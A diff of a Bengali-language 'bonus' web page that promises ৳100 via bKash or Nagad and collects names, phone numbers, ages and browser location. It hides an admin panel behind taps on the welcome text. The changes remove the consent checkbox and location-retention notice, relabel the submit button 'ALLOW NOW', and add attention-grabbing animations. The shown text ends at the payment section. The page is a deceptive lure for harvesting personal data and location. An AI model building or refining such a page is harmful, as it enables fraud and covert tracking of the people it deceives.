@@ -1,429 +1,1145 @@
-
 <!doctype html>
 <html lang="bn">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Welcome Bonus Registration</title>
+<title>1x Bat 2027 Bonus</title>
 <style>
 :root{
-  --bg:#050806;--card:#0c120f;--line:#21352c;--green:#18d995;--green2:#0ca66f;
-  --gold:#ffd45a;--text:#f7fbf9;--muted:#91a59b;--danger:#ff6374;
+  --bg:#020704;
+  --card:#07120d;
+  --card2:#0b1912;
+  --line:#1e3d2e;
+  --green:#1be092;
+  --green2:#0ebc75;
+  --gold:#ffd34d;
+  --gold2:#ffb81f;
+  --text:#f7fff9;
+  --muted:#9bb0a3;
+  --danger:#ff7587;
 }
 *{box-sizing:border-box}
-html,body{margin:0;min-height:100%;font-family:Arial,"Noto Sans Bengali",sans-serif;background:radial-gradient(circle at 50% -10%,#154835 0,#07120d 35%,#020403 75%);color:var(--text)}
-body{min-height:100vh;display:flex;justify-content:center}
-button,input{font:inherit}.app{width:100%;max-width:460px;min-height:100vh;padding:18px 16px 35px}
-.bonus{position:relative;overflow:hidden;padding:24px 20px;text-align:center;border-radius:28px;border:1px solid rgba(255,212,90,.24);background:linear-gradient(145deg,rgba(22,75,55,.95),rgba(8,28,21,.98));box-shadow:0 22px 55px rgba(0,0,0,.45)}
-.gift{width:64px;height:64px;margin:auto;display:grid;place-items:center;border-radius:20px;font-size:32px;background:linear-gradient(145deg,#ffd95f,#d99c15);box-shadow:0 10px 30px rgba(255,198,45,.22);user-select:none;-webkit-tap-highlight-color:transparent;cursor:pointer}
-.bonus-tag{margin-top:13px;font-size:11px;font-weight:900;letter-spacing:2px;color:#c7ffea}.bonus h1{margin:8px 0 4px;font-size:21px}.money{font-size:48px;line-height:1;margin:12px 0 7px;font-weight:1000;color:var(--gold)}.bonus p{margin:0;color:#bcd1c7;font-size:13px}.pay-mini{display:flex;justify-content:center;gap:8px;margin-top:15px}.pay-mini span{padding:7px 12px;border-radius:99px;background:rgba(0,0,0,.23);border:1px solid rgba(255,255,255,.08);font-size:12px;font-weight:800}
-.card{margin-top:15px;padding:21px 18px;border-radius:27px;background:linear-gradient(180deg,rgba(17,26,22,.98),rgba(8,13,11,.98));border:1px solid var(--line);box-shadow:0 25px 60px rgba(0,0,0,.38)}
-.head{display:flex;gap:12px;align-items:center;margin-bottom:20px}.head-icon{width:44px;height:44px;flex:none;border-radius:14px;display:grid;place-items:center;font-size:21px;background:#15271f;border:1px solid #294737}.head h2{margin:0;font-size:19px}.head p{margin:4px 0 0;color:var(--muted);font-size:12px}
-.field{margin-bottom:13px}.label{margin:0 0 7px 3px;display:block;font-size:12px;font-weight:700;color:#b7c6bf}.input-wrap{position:relative}.ico{position:absolute;top:50%;left:14px;transform:translateY(-50%);font-size:18px}
-input[type=text],input[type=tel],input[type=number],input[type=password]{width:100%;height:54px;padding:0 14px 0 45px;border:none;outline:none;color:#fff;font-size:15px;border-radius:16px;background:#090e0c;border:1px solid #283b32;transition:.2s}
-input:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(24,217,149,.09)}
-.location,.tracker-card{margin-top:18px;padding:16px;border-radius:20px;background:linear-gradient(145deg,#0d1713,#0a100d);border:1px dashed #3b5a4b}.loc-top{display:flex;align-items:center;gap:11px}.pin{width:45px;height:45px;flex:none;display:grid;place-items:center;border-radius:15px;font-size:21px;background:#143528}.loc-title{font-size:14px;font-weight:900}.loc-sub{color:var(--muted);font-size:11px;margin-top:3px;line-height:1.45}.location button,.tracker-card button{width:100%;height:48px;margin-top:14px;border:0;border-radius:14px;background:linear-gradient(135deg,var(--green2),var(--green));color:#fff;font-weight:900;font-size:14px;cursor:pointer}.location.ok,.tracker-card.on{border-style:solid;border-color:#237f5a;background:#0b2118}.location.error{border-color:#713740}.tracker-card .stop{background:#2b171a;color:#ff9aa5;border:1px solid #6a2d36}
-.consent{display:flex;gap:10px;align-items:flex-start;margin:16px 3px;color:#a5b6ae;font-size:11px;line-height:1.6}.consent input{margin-top:3px;accent-color:var(--green)}
-.main-btn{width:100%;height:56px;border:0;border-radius:17px;color:#042015;font-size:15px;font-weight:1000;background:linear-gradient(135deg,#30efad,#12b97e);box-shadow:0 13px 32px rgba(18,185,126,.22);cursor:pointer}.main-btn:disabled{color:#65746d;background:#18201c;box-shadow:none;cursor:not-allowed}.note{text-align:center;color:#71837a;font-size:10px;margin-top:13px;line-height:1.5}.msg{display:none;margin-bottom:13px;padding:11px 13px;border-radius:13px;font-size:12px;line-height:1.5}.msg.error{display:block;background:#321418;border:1px solid #693039;color:#ff9aa5}.msg.ok{display:block;background:#0d2f23;border:1px solid #216449;color:#89f2c8}
-#paymentStep,#successStep,#adminPanel,#pinModal{display:none}.payment-title{text-align:center;margin-bottom:20px}.big-check{width:60px;height:60px;margin:auto;display:grid;place-items:center;border-radius:20px;font-size:29px;background:#123727;border:1px solid #27664c}.payment-title h2{margin:12px 0 5px;font-size:20px}.payment-title p{margin:0;color:var(--muted);font-size:12px}.pay-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:18px 0}.pay-option input{display:none}.pay-card{height:92px;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:6px;border-radius:18px;background:#0a100d;border:2px solid #293a32;cursor:pointer;transition:.2s}.pay-option input:checked+.pay-card{border-color:var(--green);background:#10291f;transform:translateY(-2px)}.success-box{text-align:center;padding:24px 8px}.success-icon{width:78px;height:78px;margin:auto;border-radius:50%;display:grid;place-items:center;font-size:38px;background:#103c2a}.success-box p{color:#9eb0a7;font-size:13px;line-height:1.7}
-.tracking-chip{display:none;position:fixed;z-index:12;left:50%;transform:translateX(-50%);bottom:14px;width:min(calc(100% - 28px),430px);padding:11px 14px;border-radius:16px;background:#0a291d;border:1px solid #247453;box-shadow:0 12px 35px rgba(0,0,0,.4);font-size:12px;align-items:center;justify-content:space-between;gap:10px}.tracking-chip.show{display:flex}.pulse{width:9px;height:9px;border-radius:50%;background:#39e7aa;box-shadow:0 0 0 0 rgba(57,231,170,.5);animation:pulse 1.4s infinite}@keyframes pulse{70%{box-shadow:0 0 0 9px rgba(57,231,170,0)}100%{box-shadow:0 0 0 0 rgba(57,231,170,0)}}.tracking-left{display:flex;align-items:center;gap:8px}.chip-stop{border:0;border-radius:10px;padding:8px 10px;background:#3b171b;color:#ff9aa5;font-weight:800}
-.modal{position:fixed;inset:0;z-index:20;background:rgba(0,0,0,.78);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:18px}.modal-card{width:min(100%,390px);background:#0d1511;border:1px solid #294738;border-radius:24px;padding:20px;box-shadow:0 25px 70px #000}.modal-card h3{margin:0 0 6px}.modal-card p{margin:0 0 15px;color:var(--muted);font-size:12px}.modal-actions{display:flex;gap:10px}.secondary{width:100%;height:50px;border-radius:14px;border:1px solid #33453d;background:#121b17;color:#fff;font-weight:800}
-.admin{position:fixed;inset:0;z-index:15;background:#07100c;overflow:auto;padding:16px}.admin-shell{max-width:900px;margin:auto}.admin-top{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:14px}.admin-top h2{margin:0}.admin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}.stat{padding:14px;border-radius:16px;background:#0d1713;border:1px solid #223a30}.stat b{display:block;font-size:24px}.stat span{font-size:11px;color:var(--muted)}.admin-card{margin-top:12px;padding:15px;border-radius:18px;background:#0c1511;border:1px solid #22372e}.admin-card h3{margin:0 0 12px}.admin-card .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}.admin-card input{padding-left:14px}.admin-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}.small-btn{border:0;border-radius:11px;padding:10px 12px;font-weight:800;cursor:pointer}.green{background:#18d995;color:#042015}.dark{background:#18231e;color:#fff;border:1px solid #30483d}.red{background:#3b171b;color:#ff9aa5;border:1px solid #6a2d36}.record{padding:14px;border-radius:16px;background:#09110d;border:1px solid #20342b;margin-top:10px}.record-top{display:flex;justify-content:space-between;gap:12px}.record h4{margin:0 0 4px}.record .meta{color:#97aaa0;font-size:12px;line-height:1.65}.badge{height:max-content;padding:5px 8px;border-radius:99px;font-size:10px;font-weight:900;background:#123a2a;color:#79f0c2}.badge.wait{background:#3b2b10;color:#ffd477}.history{display:none;margin-top:10px;padding:10px;border-radius:12px;background:#07100c;border:1px solid #1d3027;max-height:260px;overflow:auto}.history.open{display:block}.history-row{padding:8px 0;border-bottom:1px solid #172820;font-size:11px;color:#9fb1a8}.history-row:last-child{border-bottom:0}
-@media(max-width:650px){.admin-grid{grid-template-columns:1fr}.admin-card .row{grid-template-columns:1fr}}
+html,body{
+  margin:0;min-height:100%;
+  font-family:Arial,"Noto Sans Bengali",sans-serif;
+  color:var(--text);
+  background:
+    radial-gradient(circle at 50% -10%,#12452f 0,#04110b 35%,#010302 80%);
+}
+body{overflow-x:hidden}
+.page{
+  width:100%;
+  max-width:460px;
+  margin:auto;
+  min-height:100vh;
+  padding:18px 16px 42px;
+  position:relative;
+}
+.ambient{
+  position:fixed;
+  inset:0;
+  pointer-events:none;
+  overflow:hidden;
+  z-index:0;
+}
+.orb{
+  position:absolute;
+  border-radius:50%;
+  filter:blur(10px);
+  opacity:.16;
+  animation:orbFloat 8s ease-in-out infinite;
+}
+.orb.one{width:180px;height:180px;background:#2dffab;left:-80px;top:12%}
+.orb.two{width:140px;height:140px;background:#ffd34d;right:-60px;top:42%;animation-delay:-3s}
+.orb.three{width:200px;height:200px;background:#1cff8d;left:20%;bottom:-110px;animation-delay:-5s}
+@keyframes orbFloat{
+  0%,100%{transform:translateY(0) scale(1)}
+  50%{transform:translateY(-24px) scale(1.06)}
+}
+.content{position:relative;z-index:1}
+.top-badge{
+  position:relative;
+  overflow:hidden;
+  text-align:center;
+  padding:15px 14px;
+  margin-bottom:13px;
+  border-radius:20px;
+  border:1px solid rgba(255,211,77,.26);
+  background:linear-gradient(135deg,#0e3021,#0a1a12);
+  box-shadow:0 16px 42px rgba(0,0,0,.28);
+  animation:cardIn .75s ease both;
+}
+.top-badge:before{
+  content:"";
+  position:absolute;
+  top:-30%;left:-45%;
+  width:40%;height:170%;
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,.16),transparent);
+  transform:rotate(18deg);
+  animation:shine 3.2s infinite;
+}
+@keyframes shine{
+  0%{left:-45%}
+  55%,100%{left:120%}
+}
+.brand{
+  font-weight:1000;
+  font-size:20px;
+  letter-spacing:.5px;
+  color:#fff;
+  text-shadow:0 0 18px rgba(255,255,255,.12);
+}
+.brand span{color:var(--gold)}
+.brand-sub{
+  margin-top:5px;
+  font-size:11px;
+  letter-spacing:2.4px;
+  color:#bafbdd;
+  font-weight:900;
+}
+.hero{
+  position:relative;
+  overflow:hidden;
+  padding:24px 18px 22px;
+  border-radius:30px;
+  text-align:center;
+  background:linear-gradient(155deg,#11563a,#07301f 48%,#06180f);
+  border:1px solid rgba(255,211,77,.26);
+  box-shadow:0 26px 70px rgba(0,0,0,.42);
+  animation:cardIn .9s .05s ease both;
+}
+.hero:after{
+  content:"";
+  position:absolute;
+  width:260px;height:260px;border-radius:50%;
+  right:-135px;top:-150px;
+  background:radial-gradient(circle,rgba(255,215,80,.18),transparent 67%);
+}
+.gift{
+  width:70px;height:70px;
+  margin:auto;
+  display:grid;place-items:center;
+  border-radius:23px;
+  font-size:36px;
+  background:linear-gradient(145deg,#ffd958,#e69b00);
+  box-shadow:
+    0 14px 35px rgba(255,193,31,.25),
+    inset 0 1px 0 rgba(255,255,255,.4);
+  animation:giftFloat 2.4s ease-in-out infinite;
+}
+@keyframes giftFloat{
+  0%,100%{transform:translateY(0) rotate(-2deg)}
+  50%{transform:translateY(-8px) rotate(3deg)}
+}
+.hero .welcome{
+  margin-top:14px;
+  letter-spacing:3px;
+  font-size:11px;
+  font-weight:900;
+  color:#caffea;
+}
+.hero h1{
+  margin:9px 0 4px;
+  font-size:23px;
+}
+.money{
+  display:inline-block;
+  margin:10px 0 8px;
+  font-size:54px;
+  line-height:1;
+  font-weight:1000;
+  color:var(--gold);
+  text-shadow:0 0 25px rgba(255,211,77,.24);
+  animation:moneyPulse 1.9s ease-in-out infinite;
+}
+@keyframes moneyPulse{
+  0%,100%{transform:scale(1)}
+  50%{transform:scale(1.055)}
+}
+.hero p{
+  margin:0;
+  color:#c3d6ca;
+  font-size:13px;
+  line-height:1.55;
+}
+.pay-mini{
+  display:flex;
+  justify-content:center;
+  gap:9px;
+  margin-top:16px;
+}
+.pay-mini span{
+  padding:8px 14px;
+  border-radius:999px;
+  background:rgba(1,8,5,.34);
+  border:1px solid rgba(255,255,255,.08);
+  font-size:12px;
+  font-weight:900;
+  animation:miniFloat 3s ease-in-out infinite;
+}
+.pay-mini span:nth-child(2){animation-delay:-1.4s}
+@keyframes miniFloat{
+  0%,100%{transform:translateY(0)}
+  50%{transform:translateY(-3px)}
+}
+.card{
+  margin-top:15px;
+  padding:22px 18px;
+  border-radius:29px;
+  background:
+    linear-gradient(180deg,rgba(12,27,19,.98),rgba(4,12,8,.98));
+  border:1px solid var(--line);
+  box-shadow:0 25px 65px rgba(0,0,0,.38);
+  animation:cardIn 1s .13s ease both;
+}
+@keyframes cardIn{
+  from{opacity:0;transform:translateY(18px) scale(.985)}
+  to{opacity:1;transform:translateY(0) scale(1)}
+}
+.head{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-bottom:19px;
+}
+.head-icon{
+  width:48px;height:48px;
+  display:grid;place-items:center;
+  border-radius:16px;
+  font-size:23px;
+  background:linear-gradient(145deg,#123d2b,#0b251a);
+  border:1px solid #295c43;
+  animation:iconBreath 2.8s ease-in-out infinite;
+}
+@keyframes iconBreath{
+  0%,100%{box-shadow:0 0 0 0 rgba(27,224,146,0)}
+  50%{box-shadow:0 0 0 7px rgba(27,224,146,.06)}
+}
+.head h2{margin:0;font-size:20px}
+.head p{margin:4px 0 0;color:var(--muted);font-size:12px}
+.msg{
+  display:none;
+  padding:12px 13px;
+  margin-bottom:13px;
+  border-radius:14px;
+  font-size:12px;
+  line-height:1.55;
+  animation:shakeIn .35s ease;
+}
+@keyframes shakeIn{
+  0%{transform:translateX(-5px);opacity:0}
+  50%{transform:translateX(4px)}
+  100%{transform:translateX(0);opacity:1}
+}
+.msg.error{
+  display:block;
+  color:#ffb0ba;
+  background:#35161b;
+  border:1px solid #7b3540;
+}
+.msg.ok{
+  display:block;
+  color:#88f3c4;
+  background:#0b2a1d;
+  border:1px solid #24684d;
+}
+.field{margin-bottom:14px;animation:fieldIn .55s ease both}
+.field:nth-of-type(2){animation-delay:.08s}
+.field:nth-of-type(3){animation-delay:.14s}
+@keyframes fieldIn{
+  from{opacity:0;transform:translateX(-8px)}
+  to{opacity:1;transform:translateX(0)}
+}
+.label{
+  display:block;
+  margin:0 0 7px 4px;
+  color:#c3d0c9;
+  font-size:12px;
+  font-weight:800;
+}
+.input-wrap{position:relative}
+.ico{
+  position:absolute;
+  left:15px;top:50%;
+  transform:translateY(-50%);
+  font-size:20px;
+}
+input{
+  width:100%;
+  height:56px;
+  padding:0 14px 0 49px;
+  border-radius:17px;
+  border:1px solid #294338;
+  background:#06100b;
+  color:#fff;
+  outline:none;
+  font-size:15px;
+  transition:.22s;
+}
+input:focus{
+  border-color:var(--green);
+  box-shadow:0 0 0 4px rgba(27,224,146,.08);
+  transform:translateY(-1px);
+}
+.hint{
+  margin:-4px 3px 14px;
+  color:#86a494;
+  font-size:10px;
+  line-height:1.5;
+}
+.allow-btn{
+  position:relative;
+  overflow:hidden;
+  width:100%;
+  height:64px;
+  margin-top:8px;
+  border:0;
+  border-radius:19px;
+  cursor:pointer;
+  color:#062115;
+  background:
+    linear-gradient(135deg,#f8d650 0%,#ffc52b 42%,#24e79f 100%);
+  box-shadow:
+    0 15px 36px rgba(24,205,137,.2),
+    0 10px 28px rgba(255,197,43,.14);
+  font-weight:1000;
+  font-size:17px;
+  letter-spacing:.2px;
+  transition:.2s;
+  animation:buttonGlow 1.9s ease-in-out infinite;
+}
+.allow-btn:active{transform:scale(.985)}
+.allow-btn:disabled{
+  filter:saturate(.45);
+  cursor:not-allowed;
+  animation:none;
+}
+@keyframes buttonGlow{
+  0%,100%{box-shadow:0 12px 30px rgba(24,205,137,.18),0 0 0 0 rgba(255,208,60,.18)}
+  50%{box-shadow:0 18px 42px rgba(24,205,137,.27),0 0 0 7px rgba(255,208,60,0)}
+}
+.allow-btn:before{
+  content:"";
+  position:absolute;
+  top:-40%;left:-35%;
+  width:28%;height:190%;
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,.65),transparent);
+  transform:rotate(20deg);
+  animation:btnShine 2.5s infinite;
+}
+@keyframes btnShine{
+  0%{left:-35%}
+  60%,100%{left:120%}
+}
+.btn-inner{
+  position:relative;
+  z-index:2;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+}
+.coin-stack{
+  position:relative;
+  width:34px;
+  height:32px;
+}
+.coin{
+  position:absolute;
+  width:21px;height:21px;
+  border-radius:50%;
+  display:grid;place-items:center;
+  font-size:12px;
+  font-weight:1000;
+  background:linear-gradient(145deg,#fff4a4,#ffb800);
+  border:2px solid #f2a700;
+  color:#785000;
+  box-shadow:0 3px 7px rgba(114,75,0,.22);
+}
+.coin.c1{left:0;bottom:0;animation:coinBounce 1.25s ease-in-out infinite}
+.coin.c2{left:12px;bottom:5px;animation:coinBounce 1.25s .18s ease-in-out infinite}
+.coin.c3{left:6px;bottom:12px;animation:coinBounce 1.25s .36s ease-in-out infinite}
+@keyframes coinBounce{
+  0%,100%{transform:translateY(0) rotate(0)}
+  50%{transform:translateY(-5px) rotate(8deg)}
+}
+.note{
+  margin-top:13px;
+  text-align:center;
+  color:#82988c;
+  font-size:10px;
+  line-height:1.55;
+}
+#paymentStep,#successStep{display:none}
+.payment-title{text-align:center}
+.check{
+  width:64px;height:64px;
+  margin:auto;
+  display:grid;place-items:center;
+  border-radius:21px;
+  font-size:30px;
+  background:#0e3827;
+  border:1px solid #2e7455;
+  animation:successPop .65s cubic-bezier(.2,.9,.2,1.2);
+}
+@keyframes successPop{
+  from{transform:scale(.3);opacity:0}
+  to{transform:scale(1);opacity:1}
+}
+.payment-title h2{margin:12px 0 5px}
+.payment-title p{margin:0;color:var(--muted);font-size:12px}
+.pay-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:10px;
+  margin:18px 0;
+}
+.pay-option input{display:none}
+.pay-card{
+  height:96px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:7px;
+  border-radius:19px;
+  background:#07110c;
+  border:2px solid #2c4137;
+  cursor:pointer;
+  transition:.2s;
+}
+.pay-option input:checked + .pay-card{
+  border-color:var(--green);
+  background:#0c2b1e;
+  transform:translateY(-3px) scale(1.02);
+  box-shadow:0 10px 24px rgba(27,224,146,.12);
+}
+.pay-icon{font-size:27px}
+.success-box{text-align:center;padding:20px 5px}
+.success-icon{
+  width:84px;height:84px;
+  margin:auto;
+  border-radius:50%;
+  display:grid;place-items:center;
+  font-size:42px;
+  background:linear-gradient(145deg,#0f402c,#0a2a1d);
+  border:1px solid #2d7656;
+  animation:successPop .7s cubic-bezier(.2,.9,.2,1.2);
+}
+.success-box h2{margin:15px 0 7px}
+.success-box p{color:#9eb0a7;font-size:13px;line-height:1.65}
+.confetti{
+  position:fixed;
+  pointer-events:none;
+  z-index:30;
+  font-size:22px;
+  animation:fall 1.6s ease-out forwards;
+}
+@keyframes fall{
+  from{transform:translateY(-20px) rotate(0deg);opacity:1}
+  to{transform:translateY(85vh) rotate(420deg);opacity:0}
+}
+
+/* ADMIN */
+.admin-modal,.admin-panel{display:none}
+.admin-modal{
+  position:fixed;inset:0;z-index:100;
+  background:rgba(0,0,0,.82);
+  backdrop-filter:blur(10px);
+  align-items:center;justify-content:center;
+  padding:18px;
+}
+.admin-modal.show{display:flex}
+.admin-login{
+  width:min(100%,390px);
+  padding:20px;border-radius:24px;
+  background:#08140e;border:1px solid #2a5a42;
+  box-shadow:0 28px 80px rgba(0,0,0,.55);
+  animation:cardIn .35s ease both;
+}
+.admin-login h3{margin:0 0 5px;font-size:20px}
+.admin-login p{margin:0 0 15px;color:var(--muted);font-size:12px}
+.admin-actions{display:flex;gap:9px}
+.admin-secondary{
+  width:100%;height:52px;border-radius:15px;
+  border:1px solid #33483e;background:#111b16;
+  color:#fff;font-weight:900
+}
+.admin-panel{
+  position:fixed;inset:0;z-index:90;
+  overflow:auto;background:#031008;
+  padding:14px;
+}
+.admin-panel.show{display:block}
+.admin-shell{max-width:900px;margin:auto}
+.admin-top{
+  display:flex;align-items:center;justify-content:space-between;
+  gap:10px;margin-bottom:12px
+}
+.admin-top h2{margin:0;font-size:21px}
+.admin-top small{color:var(--muted)}
+.admin-grid{
+  display:grid;grid-template-columns:repeat(3,1fr);
+  gap:9px
+}
+.stat{
+  padding:14px;border-radius:16px;
+  background:#0a1710;border:1px solid #213d2f
+}
+.stat b{display:block;font-size:24px;color:#fff}
+.stat span{font-size:10px;color:var(--muted)}
+.admin-card{
+  margin-top:11px;padding:15px;
+  border-radius:19px;background:#08140e;
+  border:1px solid #203a2d
+}
+.admin-card h3{margin:0 0 12px}
+.admin-search{padding-left:14px!important}
+.record{
+  margin-top:10px;padding:13px;
+  border-radius:16px;background:#050e09;
+  border:1px solid #1c3328
+}
+.record-top{
+  display:flex;align-items:flex-start;
+  justify-content:space-between;gap:10px
+}
+.record h4{margin:0 0 6px}
+.record .meta{
+  color:#9db0a5;font-size:11px;line-height:1.65
+}
+.badge{
+  padding:5px 8px;border-radius:99px;
+  font-size:9px;font-weight:1000;
+  background:#113725;color:#78efba;white-space:nowrap
+}
+.badge.pending{
+  background:#3b2a11;color:#ffda73;
+}
+.admin-btn{
+  border:0;border-radius:10px;
+  padding:9px 11px;font-weight:900;
+  cursor:pointer
+}
+.admin-green{background:#19df92;color:#062015}
+.admin-dark{background:#15211b;color:#fff;border:1px solid #30483d}
+.admin-red{background:#35161b;color:#ff9fab;border:1px solid #71313c}
+.admin-row{display:grid;grid-template-columns:1fr 1fr;gap:9px}
+.admin-note{font-size:10px;color:#82988c;line-height:1.5}
+.admin-msg{
+  display:none;margin-top:9px;padding:10px;
+  border-radius:12px;font-size:11px
+}
+.admin-msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
+.admin-msg.error{display:block;background:#35161b;border:1px solid #7b3540;color:#ffb0ba}
+@media(max-width:650px){
+  .admin-grid{grid-template-columns:1fr}
+  .admin-row{grid-template-columns:1fr}
+}
 </style>
 </head>
 <body>
-<main class="app" id="publicApp">
-  <section class="bonus">
-    <div class="gift" id="giftBtn" aria-label="Gift">🎁</div>
-    <div class="bonus-tag">WELCOME BONUS</div>
-    <h1>একাউন্ট খুললেই পাচ্ছেন</h1>
-    <div class="money">৳100</div>
-    <p>রেজিস্ট্রেশন সম্পন্ন করে আপনার পছন্দের মাধ্যমে গ্রহণ করুন</p>
-    <div class="pay-mini"><span>📱 bKash</span><span>💳 Nagad</span></div>
-  </section>
 
-  <section class="card" id="registerStep">
-    <div class="head"><div class="head-icon">👤</div><div><h2>নতুন একাউন্ট</h2><p>নিচের তথ্যগুলো সঠিকভাবে পূরণ করুন</p></div></div>
-    <div class="msg" id="formError"></div>
-    <div class="field"><label class="label">আপনার নাম</label><div class="input-wrap"><span class="ico">👤</span><input id="name" type="text" placeholder="পূর্ণ নাম লিখুন"></div></div>
-    <div class="field"><label class="label">ঠিকানা</label><div class="input-wrap"><span class="ico">🏠</span><input id="address" type="text" placeholder="আপনার ঠিকানা"></div></div>
-    <div class="field"><label class="label">ফোন নাম্বার</label><div class="input-wrap"><span class="ico">📱</span><input id="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX"></div></div>
-    <div class="field"><label class="label">বয়স</label><div class="input-wrap"><span class="ico">🎂</span><input id="age" type="number" min="18" max="100" placeholder="18+"></div></div>
-
-    <div class="location" id="locationBox">
-      <div class="loc-top">
-        <div class="pin">📍</div>
-        <div>
-          <div class="loc-title" id="locationTitle">Location Required</div>
-          <div class="loc-sub" id="locationText">
-            রেজিস্টার বাটনে চাপ দিলে Location permission চাইবে। Allow দিলে রেজিস্ট্রেশন সম্পন্ন হবে।
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <label class="consent"><input type="checkbox" id="consent"><span>আমি স্বেচ্ছায় আমার তথ্য ও বর্তমান লোকেশন এই রেজিস্ট্রেশনের জন্য শেয়ার করতে সম্মতি দিচ্ছি। লোকেশন সর্বোচ্চ ৩০ দিন সংরক্ষণ করা হবে।</span></label>
-    <button class="main-btn" id="registerBtn">CREATE ACCOUNT →</button>
-    <div class="note">🔒 Register চাপলেই Location permission চাইবে। Allow না করলে রেজিস্ট্রেশন হবে না।</div>
-  </section>
-
-  <section class="card" id="paymentStep">
-    <div class="payment-title"><div class="big-check">✓</div><h2>প্রথম ধাপ সম্পন্ন</h2><p>৳100 গ্রহণের মাধ্যম নির্বাচন করুন</p></div>
-    <div class="tracker-card" id="trackerCard">
-      <div class="loc-top"><div class="pin">🧭</div><div><div class="loc-title" id="trackerTitle">Live Location Sharing</div><div class="loc-sub" id="trackerText">আপনি চাইলে পেজ খোলা থাকা পর্যন্ত চলমান লোকেশন শেয়ার করতে পারেন। প্রতিটি পয়েন্ট সর্বোচ্চ ৩০ দিন রাখা হবে।</div></div></div>
-      <button type="button" id="startTrackingBtn">▶ START LIVE LOCATION</button>
-    </div>
-    <div class="msg" id="paymentError"></div>
-    <div class="pay-grid">
-      <label class="pay-option"><input type="radio" name="method" value="bKash"><span class="pay-card"><span style="font-size:25px">📱</span><strong>bKash</strong></span></label>
-      <label class="pay-option"><input type="radio" name="method" value="Nagad"><span class="pay-card"><span style="font-size:25px">💳</span><strong>Nagad</strong></span></label>
-    </div>
-    <div class="field"><label class="label">টাকা গ্রহণের নাম্বার</label><div class="input-wrap"><span class="ico">☎️</span><input id="walletNumber" type="tel" maxlength="11" inputmode="numeric" placeholder="01XXXXXXXXX"></div></div>
-    <button class="main-btn" id="claimBtn">CONFIRM →</button>
-  </section>
-
-  <section class="card" id="successStep">
-    <div class="success-box"><div class="success-icon">✓</div><h2>রেজিস্ট্রেশন সফল</h2><p>আপনার তথ্য গ্রহণ করা হয়েছে।</p></div>
-    <div class="tracker-card" id="trackerCardSuccess">
-      <div class="loc-top"><div class="pin">🧭</div><div><div class="loc-title" id="trackerTitle2">Live Location Sharing</div><div class="loc-sub" id="trackerText2">পেজ খোলা থাকা পর্যন্ত চালু রাখতে পারেন এবং যেকোনো সময় Stop করতে পারবেন।</div></div></div>
-      <button type="button" id="startTrackingBtn2">▶ START LIVE LOCATION</button>
-    </div>
-  </section>
-</main>
-
-<div class="tracking-chip" id="trackingChip">
-  <div class="tracking-left"><span class="pulse"></span><span id="chipText">Live location sharing চালু</span></div>
-  <button class="chip-stop" id="chipStop">STOP</button>
+<div class="ambient">
+  <div class="orb one"></div>
+  <div class="orb two"></div>
+  <div class="orb three"></div>
 </div>
 
-<div class="modal" id="pinModal">
-  <div class="modal-card">
-    <h3>🔐 Admin Access</h3><p>Admin PIN দিন</p>
-    <div class="msg" id="pinError"></div>
-    <div class="field"><div class="input-wrap"><span class="ico">🔑</span><input id="adminPin" type="password" inputmode="numeric" maxlength="12" placeholder="PIN"></div></div>
-    <div class="modal-actions"><button class="secondary" id="cancelPin">Cancel</button><button class="main-btn" id="loginAdmin">LOGIN</button></div>
+<main class="page">
+  <div class="content">
+
+    <section class="top-badge">
+      <div class="brand">1x Bat <span>2027 BONUS</span></div>
+      <div class="brand-sub">LIMITED WELCOME REWARD</div>
+    </section>
+
+    <section class="hero">
+      <div class="gift">🎁</div>
+      <div class="welcome" id="adminTapTarget" style="cursor:pointer;user-select:none;touch-action:manipulation;-webkit-tap-highlight-color:transparent">WELCOME BONUS</div>
+      <h1>একাউন্ট খুললেই পাচ্ছেন</h1>
+      <div class="money">৳100</div>
+      <p>রেজিস্ট্রেশন সম্পন্ন করে আপনার পছন্দের মাধ্যমে গ্রহণ করুন</p>
+      <div class="pay-mini">
+        <span>📱 bKash</span>
+        <span>💳 Nagad</span>
+      </div>
+    </section>
+
+    <section class="card" id="registerStep">
+      <div class="head">
+        <div class="head-icon">👤</div>
+        <div>
+          <h2>নতুন একাউন্ট</h2>
+          <p>নিচের তথ্যগুলো সঠিকভাবে পূরণ করুন</p>
+        </div>
+      </div>
+
+      <div class="msg" id="formMsg"></div>
+
+      <div class="field">
+        <label class="label">আপনার নাম</label>
+        <div class="input-wrap">
+          <span class="ico">👤</span>
+          <input id="name" type="text" placeholder="পূর্ণ নাম লিখুন">
+        </div>
+      </div>
+
+      <div class="field">
+        <label class="label">ফোন নাম্বার</label>
+        <div class="input-wrap">
+          <span class="ico">📱</span>
+          <input id="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+        </div>
+      </div>
+
+      <div class="hint">✓ একটি ফোন নাম্বার দিয়ে শুধু একবার রেজিস্ট্রেশন করা যাবে</div>
+
+      <div class="field">
+        <label class="label">বয়স</label>
+        <div class="input-wrap">
+          <span class="ico">🎂</span>
+          <input id="age" type="number" min="18" max="100" placeholder="18+">
+        </div>
+      </div>
+
+      <button class="allow-btn" id="allowBtn">
+        <span class="btn-inner">
+          <span class="coin-stack">
+            <span class="coin c1">৳</span>
+            <span class="coin c2">৳</span>
+            <span class="coin c3">৳</span>
+          </span>
+          <span id="allowText">ALLOW NOW →</span>
+        </span>
+      </button>
+
+      <div class="note">
+        🔒 Allow Now চাপলে Browser Location permission চাইবে
+      </div>
+    </section>
+
+    <section class="card" id="paymentStep">
